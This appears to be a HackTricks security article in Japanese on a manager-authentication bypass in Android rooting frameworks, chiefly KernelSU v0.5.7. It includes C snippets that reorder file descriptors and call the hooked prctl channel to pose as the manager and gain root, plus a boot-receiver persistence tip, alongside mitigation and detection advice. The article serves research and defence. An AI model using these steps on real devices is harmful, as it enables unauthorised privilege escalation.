# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

KernelSU、APatch、SKRoot、Magiskなどのルーティングフレームワークは、Linux/Androidカーネルを頻繁にパッチし、フックされたシステムコールを介して特権機能を特権のないユーザースペースの「マネージャー」アプリに公開します。マネージャー認証ステップに欠陥がある場合、任意のローカルアプリがこのチャネルにアクセスし、すでにルート化されたデバイスで特権を昇格させることができます。

このページは、攻撃面、悪用の原則、および堅牢な緩和策を理解するために、公開研究（特にZimperiumのKernelSU v0.5.7の分析）で明らかにされた技術と落とし穴を抽象化しています。

---
## アーキテクチャパターン: syscall-hooked manager channel

- カーネルモジュール/パッチがシステムコール（一般的にはprctl）をフックして、ユーザースペースからの「コマンド」を受け取ります。
- プロトコルは通常、magic_value、command_id、arg_ptr/len ...です。
- ユーザースペースのマネージャーアプリが最初に認証します（例: CMD_BECOME_MANAGER）。カーネルが呼び出し元を信頼されたマネージャーとしてマークすると、特権コマンドが受け入れられます：
- 呼び出し元にルートを付与する（例: CMD_GRANT_ROOT）
- suの許可リスト/拒否リストを管理する
- SELinuxポリシーを調整する（例: CMD_SET_SEPOLICY）
- バージョン/構成を照会する
- 任意のアプリがシステムコールを呼び出せるため、マネージャー認証の正確性が重要です。

例（KernelSU設計）：
- フックされたシステムコール: prctl
- KernelSUハンドラーに転送するためのマジック値: 0xDEADBEEF
- コマンドには、CMD_BECOME_MANAGER、CMD_GET_VERSION、CMD_ALLOW_SU、CMD_SET_SEPOLICY、CMD_GRANT_ROOTなどが含まれます。

---
## KernelSU v0.5.7 認証フロー（実装された通り）

ユーザースペースがprctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...)を呼び出すと、KernelSUは以下を検証します：

1) パスプレフィックスチェック
- 提供されたパスは、呼び出し元UIDの期待されるプレフィックス（例: /data/data/<pkg> または /data/user/<id>/<pkg>）で始まる必要があります。
- 参照: core_hook.c (v0.5.7) パスプレフィックスロジック。

2) 所有権チェック
- パスは呼び出し元UIDによって所有されている必要があります。
- 参照: core_hook.c (v0.5.7) 所有権ロジック。

3) FDテーブルスキャンによるAPK署名チェック
- 呼び出しプロセスのオープンファイルディスクリプタ（FD）を反復処理します。
- パスが/data/app/*/base.apkに一致する最初のファイルを選択します。
- APK v2署名を解析し、公式のマネージャー証明書と照合します。
- 参照: manager.c (FDの反復処理)、apk_sign.c (APK v2検証)。

すべてのチェックが通過すると、カーネルはマネージャーのUIDを一時的にキャッシュし、そのUIDからの特権コマンドを受け入れます。

---
## 脆弱性クラス: FD反復からの「最初に一致するAPK」を信頼する

署名チェックがプロセスFDテーブルで見つかった「最初に一致する/data/app/*/base.apk」にバインドされる場合、実際には呼び出し元のパッケージを検証していません。攻撃者は、正当な署名のAPK（本物のマネージャーのもの）を事前に配置し、自分のbase.apkよりもFDリストの早い位置に表示させることができます。

この間接的な信頼により、特権のないアプリがマネージャーを偽装できるようになります。

悪用される主な特性：
- FDスキャンは呼び出し元のパッケージIDにバインドされず、パス文字列のパターンマッチングのみを行います。
- open()は最も低い利用可能なFDを返します。低い番号のFDを最初に閉じることで、攻撃者は順序を制御できます。
- フィルターはパスが/data/app/*/base.apkに一致することのみを確認し、呼び出し元のインストールされたパッケージに対応しているかどうかは確認しません。

---
## 攻撃の前提条件

- デバイスはすでに脆弱なルーティングフレームワーク（例: KernelSU v0.5.7）でルート化されています。
- 攻撃者はローカルで任意の特権のないコードを実行できます（Androidアプリプロセス）。
- 本物のマネージャーはまだ認証されていません（例: 再起動直後）。一部のフレームワークは成功後にマネージャーUIDをキャッシュします。レースに勝つ必要があります。

---
## 悪用の概要（KernelSU v0.5.7）

高レベルのステップ：
1) プレフィックスと所有権チェックを満たすために、自分のアプリデータディレクトリへの有効なパスを構築します。
2) 自分のbase.apkよりも低い番号のFDで本物のKernelSU Manager base.apkが開かれていることを確認します。
3) prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...)を呼び出してチェックを通過させます。
4) CMD_GRANT_ROOT、CMD_ALLOW_SU、CMD_SET_SEPOLICYなどの特権コマンドを発行して昇格を持続させます。

ステップ2（FDの順序付け）に関する実用的な注意：
- /proc/self/fdシンボリックリンクを歩いて、自分の/data/app/*/base.apkのFDを特定します。
- 低いFD（例: stdin、fd 0）を閉じて、正当なマネージャーAPKを最初に開くことで、fd 0（または自分のbase.apk fdよりも低いインデックス）を占有させます。
- 正当なマネージャーAPKをアプリにバンドルし、そのパスがカーネルの単純なフィルターを満たすようにします。たとえば、/data/app/*/base.apkに一致するサブパスの下に配置します。

例のコードスニペット（Android/Linux、参考用のみ）：

オープンFDを列挙してbase.apkエントリを特定します：
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
低い番号のFDを正当なマネージャーAPKを指すように強制する：
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
マネージャー認証をprctlフックを介して:
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 0x100  // Placeholder; command IDs are framework-specific

static inline long ksu_call(unsigned long cmd, unsigned long arg2,
unsigned long arg3, unsigned long arg4) {
return prctl(KSU_MAGIC, cmd, arg2, arg3, arg4);
}

int become_manager(const char *my_data_dir) {
long result = -1;
// arg2: command, arg3: pointer to data path (userspace->kernel copy), arg4: optional result ptr
result = ksu_call(CMD_BECOME_MANAGER, (unsigned long)my_data_dir, 0, 0);
return (int)result;
}
```
成功後、特権コマンド（例）：
- CMD_GRANT_ROOT: 現在のプロセスをrootに昇格
- CMD_ALLOW_SU: 永続的なsuのためにあなたのパッケージ/UIDを許可リストに追加
- CMD_SET_SEPOLICY: フレームワークがサポートするSELinuxポリシーを調整

レース/持続性のヒント：
- AndroidManifestにBOOT_COMPLETEDレシーバーを登録（RECEIVE_BOOT_COMPLETED）して、再起動後に早期に開始し、実際のマネージャーの前に認証を試みる。

---
## 検出と緩和のガイダンス

フレームワーク開発者向け：
- 認証を呼び出し元のパッケージ/UIDにバインドし、任意のFDにバインドしない：
- UIDから呼び出し元のパッケージを解決し、FDをスキャンするのではなく、インストールされたパッケージの署名（PackageManager経由）と照合する。
- カーネル専用の場合、安定した呼び出し元のアイデンティティ（タスククレデンシャル）を使用し、プロセスFDではなく、init/userspaceヘルパーによって管理される安定した真実のソースで検証する。
- アイデンティティとしてパスプレフィックスチェックを避ける；それは呼び出し元によって簡単に満たされる。
- チャレンジ–レスポンスにnonceベースを使用し、ブート時または重要なイベント時にキャッシュされたマネージャーのアイデンティティをクリアする。
- 可能な場合、一般的なシステムコールをオーバーロードするのではなく、バインダーに基づく認証IPCを検討する。

防御者/ブルーチーム向け：
- ルート化フレームワークとマネージャープロセスの存在を検出する；カーネルテレメトリがある場合、疑わしいマジック定数（例：0xDEADBEEF）を持つprctl呼び出しを監視する。
- 管理されたフリートでは、ブート後に特権マネージャーコマンドを迅速に試みる信頼できないパッケージからのブートレシーバーをブロックまたは警告する。
- デバイスがパッチされたフレームワークバージョンに更新されていることを確認する；更新時にキャッシュされたマネージャーIDを無効にする。

攻撃の制限：
- すでに脆弱なフレームワークでルート化されたデバイスにのみ影響する。
- 通常、正当なマネージャーが認証される前に再起動/レースウィンドウが必要（いくつかのフレームワークはマネージャーUIDをリセットまでキャッシュする）。

---
## フレームワーク間の関連ノート

- パスワードベースの認証（例：歴史的なAPatch/SKRootビルド）は、パスワードが推測可能/ブルートフォース可能であるか、検証がバグを含む場合に弱くなる可能性がある。
- パッケージ/署名ベースの認証（例：KernelSU）は原則的には強力だが、FDスキャンのような間接的なアーティファクトではなく、実際の呼び出し元にバインドする必要がある。
- Magisk: CVE-2024-48336（MagiskEoP）は、成熟したエコシステムであっても、マネージャーコンテキスト内でのコード実行につながるアイデンティティの偽装に対して脆弱であることを示した。

---
## 参考文献

- [Zimperium – The Rooting of All Evil: Security Holes That Could Compromise Your Mobile Device](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [KernelSU v0.5.7 – core_hook.c path checks (L193, L201)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L193)
- [KernelSU v0.5.7 – manager.c FD iteration/signature check (L43+)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L43)
- [KernelSU – apk_sign.c APK v2 verification (main)](https://github.com/tiann/KernelSU/blob/main/kernel/apk_sign.c#L319)
- [KernelSU project](https://kernelsu.org/)
- [APatch](https://github.com/bmax121/APatch)
- [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)

{{#include ../../banners/hacktricks-training.md}}
